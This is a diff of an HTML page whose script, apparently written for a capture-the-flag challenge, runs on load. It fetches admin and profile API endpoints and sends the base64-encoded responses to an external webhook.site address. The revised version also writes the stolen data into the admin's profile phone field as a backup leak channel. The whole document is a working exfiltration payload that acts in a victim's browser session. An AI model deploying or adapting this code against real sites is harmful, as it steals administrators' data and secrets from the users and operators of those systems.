@@ -1,33 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Nothing to see here</title>
-</head>
 <body>
-    <script>
-      async function findFlag() {
-    const webhook = "https://webhook.site/9c58164d-24e0-4e24-bb41-8742b6e95e5e";
-    
-    // List of likely endpoints for a 1000pt flag
-    const targets = [
-        '/api/admin/flag',
-        '/api/admin/stats',
-        '/api/auth/me',
-        '/api/admin/settings'
-    ];
+<script>
+    async function pwn() {
+        const webhook = "https://webhook.site/9c58164d-24e0-4e24-bb41-8742b6e95e5e";
+        let flagData = "Not Found";
 
-    for (let url of targets) {
         try {
-            let response = await fetch(url);
-            let text = await response.text();
-            // Send whatever we find back to the webhook
-            fetch(`${webhook}?path=${btoa(url)}&content=${btoa(text)}`);
+            // 1. Try to grab the high-value flag
+            const response = await fetch('/api/admin/flag');
+            flagData = await response.text();
+            
+            // 2. Send to Webhook (External)
+            fetch(`${webhook}?flag=${btoa(flagData)}`);
         } catch (e) {
-            // Skip failed attempts
+            // 3. If /api/admin/flag fails, try the profile endpoint
+            const res2 = await fetch('/api/auth/profile');
+            const data2 = await res2.json();
+            flagData = JSON.stringify(data2);
+            fetch(`${webhook}?profile=${btoa(flagData)}`);
         }
+
+        // 4. Internal Leak: Write the result into the admin's own profile
+        // This is your backup in case the webhook is blocked!
+        await fetch('/api/auth/profile', {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                "phoneNumber": flagData.substring(0, 50), // Leak first 50 chars
+                "fullName": "Flag_In_Phone_Field"
+            })
+        });
     }
-}
-findFlag();
-    </script>
+    pwn();
+</script>
 </body>
 </html>
